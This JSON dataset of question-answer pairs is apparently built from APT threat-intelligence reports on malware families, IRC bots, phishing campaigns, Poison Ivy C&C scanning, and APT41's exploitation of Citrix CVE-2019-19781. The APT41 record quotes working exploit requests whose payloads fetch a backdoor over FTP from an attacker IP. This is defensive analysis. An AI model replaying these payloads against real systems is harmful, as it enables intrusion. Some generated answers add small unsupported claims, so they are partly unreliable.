[
  {
    "instruction": "Very Small Headline: FLASHFLOOD\nFLASHFLOOD appears to be an older piece of malware, or possibly one less frequently found \"in the wild\"; identified samples were compiled as early as 2005, but are less common (or nonexistent?) after 2009. FLASHFLOOD has some similarities to SPACESHIP, in that it will search for and archive files that match a configurable pattern; it even uses the same encoding process on archived files. One difference is that FLASHFLOOD will scan inserted removable drives for targeted files, and copy those files from the removable drive to the FLASHFLOOD-infected system. This may simply be yet another means to identify any \"interesting\" files for data theft, including those that happen to reside on a removable drive inserted into the victim computer. Alternately, FLASHFLOOD may have been designed to copy files that had been placed on a removable drive (perhaps by SPACESHIP), possibly copied from an \"interesting\" location such as an air-gapped network. This theory is bolstered by the fact that one of the default file extensions searched for by FLASHFLOOD is .ldf, the extension used by SPACESHIP for copied and encoded files.\nFLASHFLOOD may also log or copy additional data from the victim computer, such as system information or contacts.\nThe FLASHFLOOD sample 5d4f2871fd1818527ebd65b0ff930a77 was compiled on 17 February, 2009. When executed, the malware creates a mutex named \"MicrosoftFlashZJ\" and also creates two events named \"MicrosoftFlashExit\" and \"MicrosoftFlashHaveExit\". If the following registry key is not present, the malware creates it and continues the installation process:\nKey: HKLM\\Software\\Microsoft\\GetInf\nData: [Encoded filename of implant]\nThe filename is encoded by incrementing the hex value of each ASCII character by one.\nFLASHFLOOD copies itself to the file C:~a, then copies that file to %SystemDrive%\\Program Files\\ Outlook Express\\msinm.exe. The malware changes to the target directory, executes msinm.exe and exits.\nTo maintain persistence, FLASHFLOOD creates the following registry value:\nKey: HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\nValue: msinm.exe\nData: [Path to install]\nFLASHFLOOD attempts to read the file %WINDIR%\\FILETYPE.INI for a list of file patterns of interest. If the file does not exist the malware uses the following default file extensions:\nFLASHFLOOD creates the following directories, used to store malware log data and copied files of interest:\n%WINDIR%\\$NtUninstallKB885884$\\\n%WINDIR%\\$NtUninstallKB885884$\\FlashFiles\n%WINDIR%\\$NtUninstallKB885884$\\LastFiles\n%WINDIR%\\$NtUninstallKB885884$\\RecentFiles\nDuring initialization, FLASHFLOOD queries the registry value HKLM\\SYSTEM\\ CurrentControlSet\\Services\\SENS\\Parameters\\ServiceDll and logs the result to %WINDIR%\\$NtUninstallKB885884$\\Info.txt. 47 The file Info.txt is a general log file used by FLASHFLOOD to store information collected from the system.\nFLASHFLOOD also logs information stored in the Windows Address Book using the IAddrBook interface.48  Information logged includes User, Nick, E-mail and Type.\nFLASHFLOOD parses the shortcut (.lnk) files from the user's \"My Recent Documents\" folder and archives the target files to %WINDIR%\\$NtUninstallKB885884$\\RecentFiles. The malware uses the same format for archiving files as SPACESHIP; the original files are copied and an .ldf extension is added. The files are then zlib compressed and each byte is rotated 4 positions and XOR-encoded with 0x23.\nFLASHFLOOD creates the file %WINDIR%\\FILETIME.DAT and writes the current system time to the file in FILETIME format. 49 The file is likely used to ensure the malware collects only recent files.\nFLASHFLOOD scans connected drives and the directories \"Desktop\", \"Temporary Internet Files\" and \"TEMP\" for files that match the patterns of interest (obtained from FILETYPE.INI or the default set of file extensions). Matching files are archived to %WINDIR%\\$NtUninstallKB885884$\\LastFiles.\nFor drives attached to the system after FLASHFLOOD initially executes, the malware scans for files matching the patterns of interest. The malware's behavior differs slightly depending on the size of the detected drive.\nFor drives with a capacity less than 2,500,000,000 bytes (approximately 2.5 GB),50 FLASHFLOOD scans the entire drive and will archive any files of interest found on the drive to %WINDIR%\\$NtUninstallKB885884$\\FlashFiles, using the archive method (compress, rotate bytes, XOR) described above. For any files found in the $LDDATA$ or RECYCLED directories, FLASHFLOOD will copy the file directly 51 (no archiving is performed) and delete the original file from the detected drive.\nFor drives with a capacity greater than 2,500,000,000 bytes, FLASHFLOOD will only scan the directories $LDDATA$ and RECYCLED (if present). Any files found in these directories are copied to %WINDIR%\\$NtUninstallKB885884$\\FlashFiles and the original files are deleted.\nIn both cases, details of the scan are logged to %WINDIR%\\$NtUninstallKB885884$\\OtherInfo.txt.\nVery Small Headline: MILKMAID / ORANGEADE Droppers and CREAMSICLE Downloader\nMILKMAID and ORANGEADE are two dropper families typically installed via a malicious attachment, such as a malicious Word document. Both droppers have been observed to drop variants of the CREAMSICLE downloader. MILKMAID drops a variant of CREAMSICLE implemented as a stand-alone executable, where the slightly older ORANGEADE drops a variant of CREAMSICLE implemented as a DLL. 52\nEach dropper extracts its version of CREAMSICLE and creates a shortcut (.lnk) file that references the file to be downloaded by CREAMSICLE; that is, the dropper sets up persistence for the second stage downloaded file.\n\"India deploys world's largest military transport plane.doc\" (md5 hash 7d775a39ecd517cee4369c672e0e4da7) is an example of an exploit document \u2013 one built with a common document weaponizer that appears to be shared across multiple threat groups \u2013 that drops MILKMAID and the EXE variant of CREAMSICLE. The document creates the file firefox.exe (MILKMAID) and a non-malicious decoy document (Wor.doc) in the user's %TEMP% directory, executes firefox.exe, and displays the non-malicious document. MILKMAID extracts a compressed PE (readme.lz) from its resource section, decompresses it, and writes it to %APPDATA%\\Norton360\\Engine\\5.1.0.29 as wssfmgr.exe (CREAMSICLE).\nMILKMAID creates the shortcut file Symantec LiveUpdate.lnk in the user's Startup folder (%USERPROFILE%\\Start Menu\\Programs\\Startup) with the target path %APPDATA%\\Norton360\\ Engine\\5.1.0.29\\ccSvcHst.exe (%APPDATA% is expanded). Finally, MILKMAID launches CREAMSICLE (wssfmgr.exe).\nCREAMSICLE attempts to download an encoded executable from a specified location using the following HTTP request:\nThe downloaded file is decoded, written to disk as %APPDATA%\\Norton360\\Engine\\5.1.0.29\\ccSvcHst. exe, and padded with 51,200,000 null bytes. CREAMSICLE does not appear to execute the downloaded file, presumably relying on Windows to do so (using the shortcut file in the user's Startup folder) the next time the user logs in.\nVery Small Headline: BACKBEND\nBACKBEND is a secondary downloader used as a backup mechanism in the case the primary backdoor is removed. The BACKBEND sample af504e86416c5f643e96f6e5e69566f0 was compiled on 16 August 2007. When executed, BACKBEND checks for the presence of the mutexes MicrosoftZj or MicrosoftZjBak (both associated with BACKSPACE variants). If either of the mutexes exist, the malware exits.\nIf BACKBEND is not running from the C:\\Program Files\\Internet Explore folder as iexplore.exe, it creates the folder and copies itself as iexplore.exe to that location.\nNext, if the current execution path of the malware process is not <CSIDL_STARTUP>\\Update.exe, 53  it copies itself to that location to achieve persistence. Finally, BACKBEND starts the C:\\Program Files\\ Internet Explore\\iexplore.exe process by providing the current path of the malware as the first command line parameter.\nIf the malware process executable file path is C:\\Program Files\\Internet Explore\\iexplore.exe, BACKSPACE deletes the file given by the first command line parameter passed in. Then, the malware downloads a file from hxxp://www.cbkjdxf[.]com/04-1/04-1.htm and saves it under Windows directory as netsvc.exe. 54  BACKSPACE starts a new process using the full path of the downloaded file (%windir%\\netsvc.exe) and deletes <CSIDL_STARTUP>\\Update.exe.\nVery\nQuestion: How does FLASHFLOOD differentiate between small and large removable drives when scanning for files, and what actions does it take based on the drive size?",
    "output": "Answer: FLASHFLOOD scans connected drives and directories for files that match specific patterns of interest. For drives with a capacity less than 2,500,000,000 bytes (approximately 2.5 GB), FLASHFLOOD scans the entire drive and archives any files of interest found to %WINDIR%\\\\$NtUninstallKB885884$\\\\FlashFiles using a specific archive method (compress, rotate bytes, XOR). For any files found in the $LDDATA$ or RECYCLED directories, FLASHFLOOD copies the file directly and deletes the original file from the detected drive. For drives with a capacity greater than 2,500,000,000 bytes, FLASHFLOOD only scans the directories $LDDATA$ and RECYCLED (if present). Any files found in these directories are copied to %WINDIR%\\\\$NtUninstallKB885884$\\\\FlashFiles and the original files are deleted. In both cases, details of the scan are logged to %WINDIR%\\\\$NtUninstallKB885884$\\\\OtherInfo.txt. This differentiation allows FLASHFLOOD to efficiently manage resources while still collecting valuable data from removable drives.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: MAGICHOUND.LEASH\nThe Magic Hound campaign was also discovered deploying an IRC Bot, which we have named MagicHound.Leash. This tool was discovered when we observed a DropIt sample installing a backdoor Trojan that used IRC for its C2 communications. The bot chooses a random name from 977 hardcoded possibilities, connects to an adversary owned IRC server and joins a channel using the following IRC commands:\nUSER AS_a # # :des\nNICK Conroy\nJOIN :#kalk\nLeash obtains its commands via private messages (PRIVMSG) sent from the adversary who must also be connected to the IRC server. The following commands are available:\nAll of the commands, except for the VER command, must be issued by individuals in the IRC channel with nicknames that start with \"AS_\" or \"AF_\". This suggests that the adversary's\nIRC nickname would need to have these prefixes to control the systems infected with this Trojan. The adversary could have used this name requirement as an added measure to make sure other individuals did not join the IRC server and begin interacting with compromised systems.\nMedium Headline: MPKBot\nWe also found a second IRC bot called MPK (SHA256: d08d737fa59edbea4568100cf83cff7bf930087aaa640f1b4edf48eea4e07b19) using an IP that a Retriever sample was hosted on as a C2 server instead. This MPK IRC bot is very similar to the MPK Trojan that used a custom C2 communications protocol, as discussed in the whitepaper by CheckPoint discussing a threat group called (<http://blog.checkpoint.com/wp-content/uploads/2015/11/rocket-kitten-report.pdf>)Rocket Kitten. We believe this version of the MPK Trojan is based on the same code base, as both the IRC version and the one discussed in the above white paper have considerable similarities from a behavior standpoint and both Trojan have direct code sharing between them.\nFrom a behaviorial standpoint, both the IRC and custom protocol version of MPK save \"tmp.vbs\" and \"tmp1.vbs\" to the %TEMP% folder (both differed slightly but used the same variable names within the script) in order to copy the Trojan to its final location and to execute it. Both variants need to be executed with the command line argument \"[2]\" to avoid continually attempting to copy and execute the Trojan using the \"tmp.vbs\" and \"tmp1.vbs\" files. The two variants of MPK share the same registry key that the Trojan uses to automatically run each time the system starts, specifically:\n[HKLM and HKCU]\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\explorer\nBoth MPK variants include key loggers that are extremely similar in functionality in addition to having the same strings used for headers within the key log file. The MPK IRC Bot monitors active application windows and writes the title of the open window along with the logged keystrokes to a file at \"%temp%\\Save.tmp\". The MPK Trojan also monitors specifically for windows that are likely to contain login forms for popular web-based email clients, such as titles that contain:\n\"Gmail -\"\n\"Yahoo \u2013 login\"\n\"Sign In -\"\n\"Outlook.com -\"\nMPK will attempt to parse these window titles to identify the associated email address and record these to the log file using the following format:\n/////////////\nMail Find <email address>\n///////////\nIf the Trojan does not find the window titles associated with Gmail, Yahoo or Outlook, it saves the title to the \"Save.tmp\" file in the following format:\n+++++++++++++\nWindow= <window title>\n+++++++++++++\nThe major difference between the IRC variant and non-IRC variant of MPK is the C2 protocol used. The IRC variant creates a mutex named \"mpk1\" and attempts to connect to an IRC server at 45.58.37[.]142:6667. The MPK bot generates a random lowercase name and uses it to log into the IRC server. It then sends the following IRC commands:\nNICK bxphzrjbxp\nUSER bxphzrjbxp bxphzrjbxp bxphzrjbxp bxphzrjbxp\nTo make sure it connected to the correct server, the Trojan checks for the message sent from the IRC server after the bot connects:\nWelcome to the MpkNet IRC Network\nThe MPK bot does not join a specific IRC channel, instead sending private messages (PRIVMSG) to a user with the nick \"mpk\". After connecting to the IRC server, the MPK bot sends custom ping messages and provides an introduction via a \"!Hello\" message that contains the current logged in user of the infected host, if the user has administrator privileges, the hostname, the UUID of the system, and operating system version. Figure 7 shows the initial private messages sent from the MPK bot to the \"mpk\" account on the C2 server.\nThe commands available within the MPK IRC bot are called via a jump table, rather than a switch statement used in the custom protocol variant of MPK. The IRC variant of MPK has a command set (Table 2) that makes this an effective backdoor Trojan, specifically allowing the actors to steal credentials from the targeted system via keylogging, to navigate and interact with the file system, to run arbitrary commands, and to download and execute additional tools on the system.\n\nAnswer this question based on the above context: How does the Magic Hound campaign utilize IRC bots, specifically MagicHound.Leash, to control compromised systems? Describe the process of how the bot connects to the IRC server and receives commands.",
    "output": "The Magic Hound campaign deploys an IRC bot named MagicHound.Leash to control compromised systems. The bot selects a random name from 977 hardcoded possibilities and connects to an adversary-owned IRC server using specific IRC commands: USER AS_a # # :des, NICK Conroy, JOIN :#kalk. It then waits for commands via private messages (PRIVMSG) from the adversary, who must also be connected to the IRC server. The commands are only accepted from users with nicknames starting with 'AS_' or 'AF_', adding an extra layer of security to ensure unauthorized individuals cannot control the infected systems.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Nile Phish Infrastructure\nThe campaign's operators used commercial web hosting located in Europe ( (<https://www.choopa.com/>)Choopa and (<https://alexhost.com/>)AlexHost) to host the campaign. They have shown evidence of basic operational security practices, including server compartmentation between Phase 1 and Phase 2. Nevertheless, in what appears to have been a mistake, one domain resolved to servers from both phases at different times.\nUsing passive DNS analysis tools including (<https://www.passivetotal.org/>)PassiveTotal, we were able to further characterize the infrastructure, and how it was used throughout Phase 1 and Phase 2 of the campaign. We also identified an additional 13 domains through passive DNS research, indicating that the campaign may include a range of other targets not uncovered in our investigation.\nBig Headline: Phishing: The Royal Road to Account Compromise\nReporting on targeted threats often gets attention because of the sophistication of the attackers' tools, yet by volume many successful attacks use much less advanced technology. The recent case of an (<https://citizenlab.org/2016/08/million-dollar-dissident-iphone-zero-day-nso-group-uae/>)iOS zero day used against UAE and Mexican civil society represents a relatively sophisticated and expensive attack vector. While such an operation is costly and relatively difficult to detect, many operations that we have observed at the Citizen Lab use much less sophisticated technical means.\nIn this report we described how the Nile Phish operators used targeted, timely, and clever deceptions combined with an open-source phishing framework.\nMedium Headline: Why Do Many Threat Actors Still Use Credential Phishing?\nWhile we cannot know Nile Phish operators' reasons for choosing phishing, assuming they have access to other techniques, we can speculate that they used social engineering (<http://www.johnscottrailton.com/security-for-the-high-risk-user/>)because it works. A phishing campaign has a number of advantages, even for operators capable of obtaining expensive and sophisticated malware. Indeed, even in cases where the same operators may also possess and deploy malware.\nAs an exercise, the following table emphasizes some of the advantages of phishing as a technique to gain access to private communications when used by a well resourced actor. The table highlights some of the reasons why such actors may continue to use phishing.\nMedium Headline: Credential Phishing: Why it keeps being used as a surveillance tool\nIn using phishing, Nile Phish operators are far from alone. Citizen Lab reports have (<https://targetedthreats.net/>)repeatedly pointed out that many operators, including those with access to more sophisticated technologies, persist in phishing and other forms of basic social engineering.\nFor example, in South America, the (<https://citizenlab.org/2015/12/packrat-report/>)Packrat group, which was active against civil society in several countries, made use of credential phishing as part of its multi-year campaign. Similarly, operations targeting the Tibetan diaspora have also made (<https://citizenlab.org/2016/03/shifting-tactics/>)use of phishing, as have operations (<http://motherboard.vice.com/read/the-syrian-electronic-armys-most-dangerous-hack>)targeting the Syrian opposition, (<https://citizenlab.org/2015/08/iran_two_factor_phishing/>)Iranian pro-democracy organizations, and many others.\nMedium Headline: Cheap Ways to Make Phishing NGOs Harder\nCivil society groups make widespread use of cloud email services, file sharing and collaboration tools. These services are exceptionally helpful to organizations that do not have the resources to maintain or secure self-hosted deployments. Many of these cloud services have powerful security features, like 2-factor authentication, that are capable of blunting the impact of straightforward credential phishing. However,\nmost of these security features are not enabled by default, whether for individual users of cloud services, or for organizations. The absence of default-on security features predictably leads to a lower rate of use, and keeps the door open for phishing.\nWhat is Two Factor Authentication? Two Factor Authentication has many names, like 2 Step Authentication, Login Approvals, 2FA, and so on, but they typically refer to the same thing: combining a password with a second \"factor\" that only the authorized user has. Most commonly this is a text message sent to the user's phone. Other versions include physical tokens, code generators, authenticator apps or prompts on devices, and so on.\nFrom the perspective of an NGO however, several approaches are available to increase the cost of phishing, including using more secure forms of 2 Factor Authentication. As a next-level step, organizations can also implement phishing / social engineering awareness exercises.\nMedium Headline: Using Secure 2 Factor Authentication\nThe most common form of 2 Factor authentication is to receive SMS messages. Although a growing number of threat actors are experimenting with (<https://citizenlab.org/2015/08/iran_two_factor_phishing/>)phishing 2 Factor credentials, and tampering with (<https://www.wired.com/2016/06/hey-stop-using-texts-two-factor-authentication/>)SMS-based authentication, (<https://advox.globalvoices.org/2016/04/07/two-step-verification-in-egypt-strength-or-weakness-for-online-security/>)including in Egypt, when implemented securely the feature is a low-cost way to dramatically increase the cost-to-phish.\nOne way to increase the security of 2 Factor authentication is to move away from SMS-based authentication to (<https://support.google.com/accounts/answer/1066447?hl=en>)Authenticator Apps or, even more secure, (<https://www.yubico.com/start/>)Yubikeys. Both Google and, most recently Facebook, now support Yubikeys for authentication.\n\nQ: Why did the Nile Phish operators choose to use credential phishing despite potentially having access to more sophisticated techniques? What advantages does phishing offer over other methods?",
    "output": "A: The Nile Phish operators likely chose to use credential phishing because it is effective and has several advantages, even for well-resourced actors. Phishing campaigns are relatively easy to execute and can be highly successful due to the effectiveness of social engineering tactics. Even if operators have access to more sophisticated malware, phishing remains a cost-effective and reliable method for gaining access to private communications. Additionally, phishing can be less detectable and more straightforward to implement compared to more advanced techniques.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Exploitation of CVE-2019-19781 (Citrix Application Delivery Controller [ADC])\nStarting on January 20, 2020, APT41 used the IP address 66.42.98[.]220 to attempt exploits of Citrix Application Delivery Controller (ADC) and Citrix Gateway devices with (<https://support.citrix.com/article/CTX267027>)CVE-2019-19781 (published December 17, 2019).\nThe initial CVE-2019-19781 exploitation activity on January 20 and January 21, 2020, involved execution of the command 'file /bin/pwd', which may have achieved two objectives for APT41. First, it would confirm whether the system was vulnerable and the (<https://support.citrix.com/article/CTX267679>)mitigation wasn't applied. Second, it may return architecture-related information that would be required knowledge for APT41 to successfully deploy a backdoor in a follow-up step.\nOne interesting thing to note is that all observed requests were only performed against Citrix devices, suggesting APT41 was operating with an already-known list of identified devices accessible on the internet.\nPOST /vpns/portal/scripts/newbm.pl HTTP/1.1 Host: [redacted] Connection: close\nAccept-Encoding: gzip, deflate Accept: */*\nUser-Agent: python-requests/2.22.0\nNSC_NONCE: nsroot\nNSC_USER: ../../../netscaler/portal/templates/[redacted]\nContent-Length: 96\nurl=http://example.com&title=[redacted]&desc=[% template.new('BLOCK' = 'print `file /bin/pwd`') %]\nFigure 2: Example APT41 HTTP traffic exploiting CVE-2019-19781\nThere is a lull in APT41 activity between January 23 and February 1, which is likely related to the Chinese Lunar New Year holidays which occurred between January 24 and January 30, 2020. This has been a common activity pattern by Chinese APT groups in past years as well.\nStarting on February 1, 2020, APT41 moved to using CVE-2019-19781 exploit payloads that initiate a download via the File Transfer Protocol (FTP). Specifically, APT41 executed the command '/usr/bin/ftp -o /tmp/bsd ftp://test: [redacted]\\@66.42.98[.]220/bsd', which connected to 66.42.98[.]220 over the FTP protocol, logged in to the FTP server with a username of 'test' and a password that we have redacted, and then downloaded an unknown payload named 'bsd' (which was likely a backdoor).\nPOST /vpn/../vpns/portal/scripts/newbm.pl HTTP/1.1\nAccept-Encoding: identity\nContent-Length: 147\nConnection: close\nNsc_User: ../../../netscaler/portal/templates/[redacted]\nUser-Agent: Python-urllib/2.7\nNsc_Nonce: nsroot\nHost: [redacted]\nContent-Type: application/x-www-form-urlencoded url=http://example.com&title=[redacted]&desc=[% template.new('BLOCK' = 'print `/usr/bin/ftp -o /tmp/bsd ftp://test: [redacted]\\@66.42.98[.]220/bsd`') %]\nFigure 3: Example APT41 HTTP traffic exploiting CVE-2019-19781\nWe did not observe APT41 activity at FireEye customers between February 2 and February 19, 2020. China initiated COVID-19 related quarantines in cities in Hubei province starting on January 23 and January 24, and rolled out quarantines to additional provinces starting between February 2 and February 10. While it is possible that this reduction in activity might be related to the COVID-19 quarantine measures in China, APT41 may have remained active in other ways, which we were unable to observe with FireEye telemetry. We observed a significant uptick in CVE-2019-19781 exploitation on February 24 and February 25. The exploit behavior was almost identical to the activity on February 1, where only the name of the payload 'un' changed.\nPOST /vpn/../vpns/portal/scripts/newbm.pl HTTP/1.1 Accept-Encoding: identity Content-Length: 145 Connection: close\nNsc_User: ../../../netscaler/portal/templates/[redacted]\nUser-Agent: Python-urllib/2.7\nNsc_Nonce: nsroot\nHost: [redacted]\nContent-Type: application/x-www-form-urlencoded url=http://example.com&title= [redacted]&desc=[% template.new('BLOCK' = 'print `/usr/bin/ftp -o /tmp/un ftp://test: [redacted]\\@66.42.98[.]220/un`') %]\nFigure 4: Example APT41 HTTP traffic exploiting CVE-2019-19781\nCitrix released a (<https://support.citrix.com/article/CTX267027>)mitigation for CVE-2019-19781 on December 17, 2019, and as of January 24, 2020, released permanent fixes for all supported versions of Citrix ADC, Gateway, and SD-WAN WANOP.\nBig Headline: Cisco Router Exploitation\nOn February 21, 2020, APT41 successfully exploited a Cisco RV320 router at a telecommunications organization and downloaded a 32-bit ELF binary payload compiled for a 64-bit MIPS processor named 'fuc' (MD5: 155e98e5ca8d662fad7dc84187340cbc). It is unknown what specific exploit was used, but there is a Metasploit module (<https://www.rapid7.com/db/modules/exploit/linux/http/cisco_rv32x_rce>)that combines two CVE's ( and ) to enable remote code execution on Cisco RV320 and RV325 small business routers and uses wget to download the specified payload.\nGET /test/fuc\nHTTP/1.1\nHost: 66.42.98\\.220\nUser-Agent: Wget\nConnection: close\nFigure 5: Example HTTP request showing Cisco RV320 router downloading a payload via wget\n66.42.98[.]220 also hosted a file name http://66.42.98[.]220/test/1.txt. The content of 1.txt (MD5: c0c467c8e9b2046d7053642cc9bdd57d) is 'cat /etc/flash/etc/nk_sysconfig', which is the command one would execute on a Cisco RV320 router to display the current configuration.\nCisco PSIRT confirmed that fixed software to address the noted vulnerabilities is available and asks customers to review the following security advisories and take appropriate action:\n\nWhat was the significance of the lull in APT41 activity between January 23 and February 1, 2020, and how did this correlate with external events? Additionally, what changes in APT41's exploitation strategy were observed after this period?",
    "output": "A: The lull in APT41 activity between January 23 and February 1, 2020, was likely related to the Chinese Lunar New Year holidays, which occurred between January 24 and January 30, 2020. This has been a common activity pattern for Chinese APT groups in past years. After this period, starting on February 1, 2020, APT41 moved to using CVE-2019-19781 exploit payloads that initiated a download via the File Transfer Protocol (FTP), indicating a shift in their exploitation strategy to download potential backdoors onto compromised systems.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Big Headline: Summary\nThe following release statement provides a brief summary of information related to the \"1.php\" Group dating from 2008 to present. This Group's methods tend to be spear-phishing emails with malicious PDF attachments or web links to binary executables with a Poison Ivy remote administration tool (RAT) payload. The Group's targeted victims included China/US relations experts, Defense entities, and the Geospatial industry.  Zscaler detected repeated infections from this Group to a customer related to this target list. The following report summarizes the incident details to increase awareness of these attacks in order to increase detection, response, and prevention. A much more detailed report has been provided to impacted parties, stakeholders, and other trusted groups dealing with these incidents. The larger report dives into more details about the command and control servers (C&Cs) being used by this Group. If you are working on similar research would like to collaborate, please contact threatlabz@zscaler.com and we will share the detailed report with select entities.\nBig Headline: Section 2: Customer Infection Behavior\nZscaler has observed on-going attacks from June 2010 to present, involving a Cleared Defense Contractor. Given the entity involved and the characteristics of the traffic observed, Zscaler believes that the attack is directly related to the \"1.php\" Group. While these attacks appear related to the \"1.php\" Group, the beacons do not bear the previously mentioned \"1.php\" HTTP path.  However, there are many similarities regarding these \"new\" beacons as well as direct relationships regarding previously identified domains and IPs used by the \"1.php\" group.  Presumably, these \"new\" beacon behaviors have been altered to evade any signatures designed to detect the previous \"1.php\" beaconing behavior.\nMedium Headline: 2.1 GET Beacons with Modified XOR Parameters\nOne of the first variations that we noticed in the attacks, was that the infected hosts sent HTTP GET request check-ins to URLs with the general pattern of:\nFQDN/css.ashx?sc=[data1]&sp=[data2]&ad=[data3]&dh=[data4]&mr=[d ata5]&tk=\nThe data parameters contained the same victim information as mentioned in the \"1.php\" beacons and were also base64 encoded and XORed with a key.  Examples of C&Cs that we observed for this particular check-in variant include:\n\u2022 HOUSE.SUPERDOGDREAM.COM\n\u2022 HOME.ALLMYDEARFRIENDS.COM\n\u2022 GOOGLETIME.SERVEIRC.COM *\n\u2022 INFO.SPORTGAMEINFO.COM\n\u2022 PEOPLE.ENJOYHOLIDAYS.NET\n\u2022 PEARHOST.SERVEHALFLIFE.COM *\n(June 2010 \u2013 1st C&C observed in infection)\n\"       Zscaler believes that ongoing attacks against a sensitive customer are directly related to the \"1.php\" Group.\"\n-Zscaler ThreatLabZ\nMedium Headline: 2.2 GET Beacons with Data moved to URL path\nThe next variation that we noticed in attacks, involved the infected hosts sending HTTP GET request check-ins to URLs with the general pattern of:\nFQDN/[data1]/[data2]/[data3]/[data4]/[data5]\nThe data did not appear to be XORed in the same manner as the beacons that were previously identified.  However, based on size and number of data blocks, it appears that the beacons contain similar information from the victims.  Examples of C&Cs used in this infection variant include:\n\u2022 SATELLITE.QUICKSEARCHMOVIE.COM\n\u2022 WWW.TOYHOPING.COM\n\u2022 WORK.FREETHROWLINE.NET\n\u2022 SEA.ANIMALFANS.NET\n\u2022 WWW.SEARCHSEA.NET\n\u2022 LOVE.ANIMALFANS.NET\n\u2022 WWW.JOBCALL.ORG\nMedium Headline: 2.3 HTTPS CONNECTs to C&Cs\nThe latest variations on these attacks are related to customer infections beginning on August 3, 2011.  Prior to infection for this incident, as well as the previous ones listed, web transaction logs did not provide any strong evidence of the infection point \u2013 it is currently believed that the infection point was through malicious email attachments (as was the case in many of the \"1.php\" OSINT incidents).  Following infection, many web transactions were witnessed each hour to the C&C servers via HTTPS with the following behaviors:\n\u2022 CONNECT on port 443/TCP with 200 HTTP response code\n\u2022 HTTP request version 1.0 with HTTP response version 1.1\n\u2022 Request size for \"keep-alive\" beacons were primarily 227 \u2013 228 bytes\n\u2022 Response size is most commonly between 969 \u2013 990 bytes\n\u2022 Microsoft Internet Explorer 6.0 user-agent string (hard-coded into malware, as this is not a standard browser for this customer)\n\"    \u2026it is currently believed that the infection point was through malicious email attachments (as was the case in many of the \"1.php\" OSINT incidents). \"\n-Zscaler ThreatLabZ\nExamples of C&Cs used in this infection variant include:\n\u2022 WWW.SAVAGECOUNTY.NET\n\u2022 LOOK.CAPTAINSABERTOOTH.NET\n\u2022 GEOINFO.SERVEHTTP.COM *\n\u2022 ROSE.OFFICESKYLINE.COM\n\u2022 WWW.CAREERCHALLENGES.NET\n\u2022 OFFER.AMERICAMS.N\nBig Headline: Section 3: Incident Inter-Relationships\nThere are a number of domains and IP addresses that have been tied to the previously mentioned incidents. Toward the beginning of the report it was stated that we believed all of these incidents to be related. As has already been seen, there are some similarities across the incidents, such as same victim organization, similar beaconing data blocks, and infection believed to be from malicious email attachments.  However, the strongest evidence for their relationship is the fact that related domains and IPs are used for C&Cs across these incidents.\nThe following Figure 3 - Link-Graph of \"1.php\" Incident Inter-Relationship provides this illustration with only a small snippet of information from these incidents:\n\nQuestion: What evidence supports the inter-relationship of the incidents attributed to the '1.php' Group, and how were these relationships established?\n\nAnswer:",
    "output": "The evidence supporting the inter-relationship of the incidents includes several factors. Firstly, the same victim organization was targeted across multiple incidents. Secondly, the beaconing data blocks showed similarities, indicating a consistent methodology. Thirdly, the infection vector was believed to be malicious email attachments, which is a common tactic for the '1.php' Group. Most importantly, the strongest evidence comes from the use of related domains and IP addresses for C&Cs across these incidents. These shared resources suggest a coordinated effort by the same group, reinforcing the belief that all incidents are interconnected.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Answer based on context:\n\nMedium Headline: 1.4 Ethical choices\nIn this chapter is described our approach about the ethical choices made during this work.\nFirst, we warned the national and/or private Computer Security Incident Response Teams (CSIRT - CERT) associated to the targets of the attackers. Before publishing this report, we have waited for a reasonable time. Finally, all the servers from which we collected data belonged to the attackers. We do not attack or try to attack compromised machines.\nMedium Headline: 2.1 Command & Control scanner\nIn the Mandiant report, it is explained that the attacker used a well-known Remote Administration Tool (RAT) called Poison Ivy. This RAT can be freely downloaded here: . This RAT will be discussed in the next chapter.\nTo identify the machines that were using this RAT, we have developed a Poison Ivy scanner. Here is the code of this scanner:\nThe scanner sends 100 times 0x00 to a specific port and IP. If in the response the server sends back 100 other bytes followed by the specific data 0x000015D0, we know that the running service is a Poison Ivy server.\nWe chose to scan the following ports:\n\uf0b7 3460 (default Poison Ivy port)\n\uf0b7 80 (HTTP port)\n\uf0b7 443 (HTTPS port)\n\uf0b7 8080 (alternate HTTP port).\nWe decided to scan a wide IP range located in Hong Kong.\nMedium Headline: 2.3 Working hours\nWe had some difficulties to identify the C&C servers because the attackers stopped the Poison Ivy daemon when they were not using it. That explains why the scanner did not identify all the C&C servers at certain moments of the day. However, using this parameter, we were able to identify their working hours. Here is the average working hours for a week (the hour on the graph is UTC+1):\nGenerally, the attackers worked between 2AM and 10AM from Monday to Saturday included.\nMedium Headline: 3.2 Remote code execution vulnerability\nAn exploitable vulnerability has been discovered by Andrzej Dereszowski from SIGNAL 11. The description of the vulnerability can be found here: . This vulnerability allows the remote execution of arbitrary code on the command & control server. Metasploit framework provides an exploit to use this vulnerability. The code is available here: .\nThis exploit did not work in our context. The exploit has two possible exploitations:\n- by using the default password: admin\n- by using brute force\nAs the two methods did not work; we created a third one. This method consists of finding the real password used for the encryption. Our homemade exploit with an option for the password is available in Appendix.\nFor information, an additional Ruby package is needed to use the camellia cipher. The package can be installed using the gem command:\nroot@alien:# gem install camellia-rb\nThe next step was to find the password used to encrypt the communication.\nMedium Headline: 3.3 Encryption key brute forcing\nThe RAT uses a key to encrypt the communication. The password is set by the administrator and its default value is \"admin\". After a quick search on the Internet, we know that Poison Ivy uses Camellia as encryption algorithm. The encryption is made with 16 bytes blocks. So we decided to choose the following approach:\n- Send 100 bytes (with 0x00) to the daemon (same than in our scanner)\n- Get the first 16 bytes as result from the server\nHere is the formula of the result:\nThe result is not a printable value. Thus, we decided to make a base64 of this value and add the flag $camellia$ to identify the algorithm. Here is an example of result:\n$camellia$ItGoyeyQIvPjT/qBoDKQZg==\nTo get the key, we developed a \"John the Ripper\" extension. \"John the Ripper\" is an open source password cracker. The source code can be downloaded here: . OpenSSL provides the camellia algorithm. The code source of the \"John the Ripper\" plugin to crack camellia hashes by using the OpenSSL library is available in the appendix.\nAfter compiling \"John the Ripper\", a new format is available: camellia. Here is an 